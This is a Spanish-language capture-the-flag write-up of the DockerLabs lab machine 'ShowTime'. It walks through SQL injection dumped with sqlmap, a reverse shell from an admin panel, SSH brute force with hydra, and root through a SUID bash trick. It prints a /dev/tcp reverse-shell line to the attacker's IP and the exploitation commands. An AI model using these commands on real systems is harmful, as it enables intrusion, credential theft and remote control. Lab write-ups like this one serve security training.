# 💻 Maquina Showtime\_Sql

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-30 214832.png" alt=""><figcaption><p>ShowTime</p></figcaption></figure>

* **Nombre de la Máquina:** ShowTime
* **Sistema Operativo:** Linux
* **Dificultad:** Fácil
* **Plataforma:** [DockerLabs](https://dockerlabs.es/)
* **Dirección IP:** 172.17.0.2
* **Vulnerabilidad**: SqlInyection

### Escaneo de Puertos

Bueno el dia de hoy empezamos haciendo un escaneo de puertos, para saber que tenemos corriendo.

`sudo nmap -sS -p- --open -T5 -n -Pn -v 172.17.0.2 -oG allports`

```sh

───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allports
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Sep 30 21:53:26 2024 as: /usr/lib/nmap/nmap -sS -p- --open -T5 -n -Pn -v -oG allports 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 22/open/tcp//ssh///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Mon Sep 30 21:53:27 2024 -- 1 IP address (1 host up) scanned in 0.86 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                                                                                                                                                    
```

De resultado nos arroja abiertos los puertos 22,80 por lo que vamos hacer un escaneo para saber que servicios tenemos corriendo sobre estos puertos.

`nmap -sCV -p22,80 172.17.0.2`

```
       │ File: Puertos
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Mon Sep 30 21:59:47 2024 as: /usr/lib/nmap/nmap --privileged -sCV -p22,80 -oG Puertos 172.17.0.2
   2   │ Host: 172.17.0.2 (vulnvault.dl) Status: Up
   3   │ Host: 172.17.0.2 (vulnvault.dl) Ports: 22/open/tcp//ssh//OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)/, 80/open/tcp//http//
       │ Apache httpd 2.4.58 ((Ubuntu))/
   4   │ # Nmap done at Mon Sep 30 21:59:55 2024 -- 1 IP address (1 host up) scanned in 7.73 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### Explotacion

Luego de revisar las versiones de los puertos procedemos a revisar la Ip en el puerto 80 y encontramos una web como de un casino y en la parte superior tenemos un enlace a login..

<figure><img src="../../.gitbook/assets/Captura de pantalla 20k24-09-30 214832.png" alt=""><figcaption></figcaption></figure>

Ingresamos al Login y vemos que efectivamente tenemos un panel de Login que después de efectuar diferentes combinaciones root:root admin:admin, le ingresamos una palabra acompañado de una comilla y vemos que es vulnerable a Sqlinyection.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-09-30 224744.png" alt="" width="265"><figcaption></figcaption></figure>

```
// Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1 in /var/www/html/login_page/auth.php:29 Stack trace: #0 /var/www/html/login_page/auth.php(29): mysqli_query() #1 {main} thrown in /var/www/html/login_page/auth.php on line 29
```

Al ver que puede ser Vulnerable a SqlInyection procedemos a usar la herramienta [`slqmap`](#user-content-fn-1)[^1]



```bash
sqlmap -u http://showtime.dl/login_page/index.php --forms --batch --dbs
```

* _**sqlmap**: Es una herramienta de código abierto utilizada para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web._
* &#x20;_**-u http://showtime.dl/login\_page/index.php**: Esta opción especifica la URL de la página web que     se va a probar. En este caso, es la página de inicio de sesión de la aplicación._
* _**--forms**: Esta opción le indica a sqlmap que busque formularios en la página especificada y que intente extraer información de esos formularios para llevar a cabo las pruebas de inyección SQL._
* _**--batch**: Esta opción permite que sqlmap funcione en modo no interactivo, utilizando respuestas predeterminadas para cualquier pregunta que normalmente requeriría interacción del usuario. Esto es útil si quieres automatizar el proceso sin tener que confirmar cada acción._
* _**--dbs**: Con esta opción, sqlmap intentará obtener una lista de las bases de datos disponibles en el servidor. Esto se utiliza comúnmente después de haber identificado una vulnerabilidad de inyección SQL._

Y efectivamente nos encuentra 5 bases de datos y por obvias razones la base que nos interesa es Users, por lo tanto vamos  trabajar con ella

```
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users
```

`sqlmap -u http://showtime.dl/login_page/index.php --forms --batch --dbs -D users -tables`

* _**-D users**: Especifica que quieres trabajar con la base de datos llamada "users"._
* _**--tables**: Indica que deseas listar las tablas dentro de la base de datos especificada._

Y luego hallamos una tabla llamada `usuarios`  asi que ingresamos

```
Database: users
[1 table]
+----------+
| usuarios |
+----------+
```

`sqlmap -u http://showtime.dl/login_page/index.php --forms --batch --dbs -D users -T usuarios -columns`

* **-T usuarios**: Indica que deseas trabajar con la tabla llamada "usuarios".
* **--columns**: Solicita que sqlmap liste las columnas de la tabla especificada.

```
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int unsigned |
| password | varchar(50)  |
| username | varchar(50)  |
+----------+--------------+
```

Y entonces GUALA ahora solo es dumpear la tabla para así obtener las credenciales

`sqlmap -u http://showtime.dl/login_page/index.php --forms --batch --dbs -D users -T usuarios -columns --dump`

* **--dump**: Extrae y muestra todos los registros de la tabla "usuarios".

```
Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | xxxxx65xxxxxx        | lxxxs    |
| 2  | 1xxxx6123456         | sxxxxxgo |
| 3  | Mxxxxxxxxxxxxckeable | joxxxxe  |
+----+----------------------+----------+
```

Una vez con estas credenciales vamos intentar ingresar ala pagina para ver que hay y encontramos un  panel de Administración donde podemos correr comandos Python.

<figure><img src="../../.gitbook/assets/image (9).png" alt="" width="321"><figcaption></figcaption></figure>

Ejecutamos nuestra revershell con python mientras en una terminal tenemos nuestro puerto ala espera con `nc -nlvp 443`

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Y efectivamente logramos a conexion..

### Post explotacion

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Trate de escalar privilegios al usuario joe con `su joe` e ingresar la contraseña con a que tuvimos acceso al panel pero no fue posible, busque archivos SUID pero tampoco habia nada interesante en la carpeta `/tmp` encontramos un archivo oculto ./.hidden\_text.txt al abrirlo encontre una especie de Diccionario con todas la palabras en mayuscula me las copie en mi maquina.

```
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: words.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HESOYAM
   2   │ UZUMYMW
   3   │ JUMPJET
   4   │ LXGIWYL
   5   │ KJKSZPJ
   6   │ YECGAA
   7   │ SZCMAWO
   8   │ ROCKETMAN
   9   │ AIWPRTON
  10   │ OLDSPEEDDEMON
  11   │ CPKTNWT
  12   │ WORSHIPME
  13   │ NATURALTALENT
  14   │ BUFFMEUP
  15   │ AEZAKMI
  16   │ BRINGITON
  17   │ FULLCLIP
  18   │ CVWKXAM
  19   │ OUIQDMW
  20   │ PROFESSIONALSKIT
  21   │ PROFESSIONALTOOLS
  22   │ NINJATOWN
  23   │ STINGLIKEABEE
  24   │ GHOSTTOWN
  25   │ BLUESUEDESHOES
  26   │ SPEEDITUP
  27   │ SLOWITDOWN
  28   │ SLOWITDOWNBRO
  29   │ BAGUVIX
  30   │ CJPHONEHOME
  31   │ SPEEDFREAK
  32   │ BUBBLECARS
  33   │ KANGAROO
  34   │ CRAZYTOWN
  35   │ EVERYONEISRICH
  36   │ EVERYONEISPOOR
  37   │ CHITTYCHITTYBANGBANG
  38   │ FLYINGTOSTUNT
  39   │ FLYINGFISH
  40   │ MONSTERMASH
:
```

Lance fuerza bruta con hydra en ssh para el usuario joe y luciano pero no encontramos nada por ende pase el archivo que tenia las palabras en mauscula a minuscula e hice de nuevo el procedimiento con hydra.

`awk '{ print tolower($0) }' words.txt > lista_min.txt`

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt="" width="563"><figcaption></figcaption></figure>

Ya tenemos un usuario y una contraseña para ingresar por `ssh`

### Usuario Joe

```bash
> ssh joe@172.17.0.2
joe@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.10.9-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Oct  1 01:45:55 2024 from 172.17.0.1
-bash-5.2$ whoami
joe
-bash-5.2$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Una vez dentro listamos los permisos &#x20;

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos permiso como luciano con `POSH` un herramienta de linea de comandos parecida a bash entonces corremos&#x20;

### Usuario Luciano

```bash
sudo -u luciano posh
```

Una ve esto ya somos usuario luciano&#x20;

<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Como vemos al buscar SUID vemo que el archivo script.sh tiene permisos Root por lo que vamos a la ubicacion y miramos que tiene

```bash
!/bin/bash\n\nbash 
-c '"'"'exec 5<>/dev/tcp/(nuestra ip)/443; cat <&5 | bash >&5 2>&5'"'"''
```

Vemos que es una revershell pero al tratar de modificarla no podemos ni con nano ni con vim por lo que procedo a modificar su contenido con echo

```bash
echo "chmod u+s /bin/bash" > script.sh

```

Le otorgamos ala bash permisos SUID&#x20;

`sudo /bin/bash  /home/luciano/script.sh`

Ejecutamos bash -p para tener una shell como root y...

<figure><img src="../../.gitbook/assets/image (6) (1).png" alt="" width="119"><figcaption></figcaption></figure>

[^1]: 
